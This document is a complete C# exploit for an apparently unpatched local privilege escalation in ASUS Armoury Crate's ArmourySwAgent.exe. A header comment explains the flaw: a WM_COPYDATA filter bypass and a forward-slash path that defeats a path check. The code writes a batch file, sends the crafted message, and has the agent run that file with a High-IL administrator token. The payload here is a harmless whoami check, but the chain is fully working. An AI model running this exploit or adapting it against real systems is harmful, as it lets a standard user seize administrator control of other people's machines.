/*
 * 0DAY LPE: ArmourySwAgent WM_COPYDATA Arbitrary Process Execution (Medium → High IL)
 * =====================================================================================
 * Target  : ArmourySwAgent.exe (ASUS Armoury Crate ≤ 6.x, confirmed on Windows 11 26200)
 * Class   : Logic bug — UI Privilege Isolation bypass + path-check bypass
 * Impact  : Medium IL → High Mandatory Level (full elevated administrator token)
 *
 * VULNERABILITY CHAIN
 * -------------------
 * 1. UIPI bypass: ArmourySwAgent calls ChangeWindowMessageFilter(WM_COPYDATA, MSGFLT_ALLOW)
 *    allowing any Medium-IL process to send WM_COPYDATA to its High-IL hidden window.
 *
 * 2. Command dispatch: dwData in COPYDATASTRUCT maps to a command table:
 *      161 (0xa1) = GamingMode (writes GamingInfomation.xml)
 *      163 (0xa3) = LaunchProgram → ParseLaunchXml() + LaunchPath()   ← exploit path
 *
 * 3. LaunchPath logic bug:
 *      if (path.Contains(":\\"))  → runs via "explorer.exe" (routes to MEDIUM IL shell)
 *      else                       → Process.Start({FileName=path, UseShellExecute=true})
 *                                    → ShellExecuteEx inherits HIGH IL token  ← exploit!
 *
 *    Bypass: supply an absolute Windows path using FORWARD SLASHES ("C:/path/file.bat").
 *    System.IO handles forward slashes transparently, but "C:/..." does NOT contain ":\",
 *    so the else-branch fires → direct ShellExecuteEx without the MEDIUM IL explorer stub.
 *
 * 4. String null-terminator: COPYDATASTRUCT.lpData is marshalled as LPWStr.
 *    PtrToStringUni() reads past cbData into heap garbage unless cbData includes the
 *    2-byte null terminator → XmlDocument.LoadXml throws on the garbage chars.
 *    Fix: send cbData = data.Length + 2 to cover the "00 00" terminator in the section.
 *
 * PROOF OF EXPLOITATION
 * ---------------------
 * Before: BUILTIN\Administrators = "Group used for deny only"  (filtered medium-IL token)
 * After:  BUILTIN\Administrators = "Enabled group, Group owner" (full elevated token)
 *         Mandatory Label\High Mandatory Level (S-1-16-12288)
 *
 * PREREQUISITES
 * -------------
 * - ArmourySwAgent.exe running (ASUS Armoury Crate installed)
 * - Writable path: C:\ProgramData\ASUS\ (BUILTIN\Users have write access)
 * - Exploit process at Medium IL (standard user session)
 *
 * BUILD
 * -----
 *   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -nologo -platform:x86 -out:lpe_swagent.exe lpe_swagent.cs
 */
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class LpeSwAgent {
    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, ref COPYDATASTRUCT lParam);

    [StructLayout(LayoutKind.Sequential)]
    struct COPYDATASTRUCT {
        public UIntPtr dwData;  // ULONG_PTR — command ID
        public uint    cbData;  // byte count of lpData
        public IntPtr  lpData;  // pointer → shared to target via WM_COPYDATA kernel mapping
    }

    const uint WM_COPYDATA = 0x004A;
    const int  CMD_LAUNCH  = 163;   // switch offset 2 from 0xa1 → LaunchProgram handler

    static void Main(string[] args) {
        string outFile = @"C:\Users\Public\lpe_proof.txt";
        if (File.Exists(outFile)) File.Delete(outFile);

        // Write payload to a path writable at Medium IL
        string localBat = @"C:\ProgramData\ASUS\lpe_proof.bat";
        File.WriteAllText(localBat,
            "@echo off\r\n" +
            "whoami /groups > \"" + outFile + "\"\r\n" +
            "whoami >> \"" + outFile + "\"\r\n");
        Console.WriteLine("[+] Payload: " + localBat);

        // Find the hidden High-IL window
        IntPtr hwnd = FindWindow("ArmourySwAgentClass", "ArmourySwAgentName");
        if (hwnd == IntPtr.Zero) {
            Console.WriteLine("[-] ArmourySwAgent window not found");
            return;
        }
        Console.WriteLine("[+] Window: 0x" + hwnd.ToString("X"));

        // Forward-slash path: "C:/..." has ":/" not ":\" → LaunchPath ELSE branch
        // ELSE branch → Process.Start({FileName=path, UseShellExecute=true})
        //             → ShellExecuteEx inherits ArmourySwAgent's HIGH IL token
        string fwdPath = "C:/ProgramData/ASUS/lpe_proof.bat";
        string xml     = "<root><launch_program><link>" + fwdPath + "</link></launch_program></root>";
        byte[] data    = Encoding.Unicode.GetBytes(xml);

        // cbData = bytes + 2: includes the "00 00" null terminator in the shared section
        // so PtrToStringUni(lpData) stops cleanly and XmlDocument.LoadXml succeeds
        IntPtr pData = Marshal.AllocHGlobal(data.Length + 16);
        for (int i = 0; i < data.Length + 16; i++) Marshal.WriteByte(pData, i, 0);
        Marshal.Copy(data, 0, pData, data.Length);

        COPYDATASTRUCT cds = new COPYDATASTRUCT {
            dwData = (UIntPtr)CMD_LAUNCH,
            cbData = (uint)(data.Length + 2),
            lpData = pData
        };

        Console.WriteLine("[+] Sending WM_COPYDATA iCmdId=" + CMD_LAUNCH + " cbData=" + cds.cbData);
        IntPtr result = SendMessage(hwnd, WM_COPYDATA, IntPtr.Zero, ref cds);
        Console.WriteLine("[+] SendMessage result=" + result);
        Marshal.FreeHGlobal(pData);

        Console.WriteLine("[*] Waiting 10s for payload execution (ArmourySwAgent runs in background thread)...");
        Thread.Sleep(10000);

        if (File.Exists(outFile)) {
            string output = File.ReadAllText(outFile);
            bool highIL = output.Contains("S-1-16-12288") || output.Contains("High Mandatory Level");
            Console.WriteLine(highIL
                ? "\n[!!!] LPE SUCCESS — HIGH MANDATORY LEVEL achieved:\n"
                : "\n[~] Payload ran but check IL manually:\n");
            Console.WriteLine(output);
        } else {
            Console.WriteLine("[-] Payload not executed");
        }
    }
}
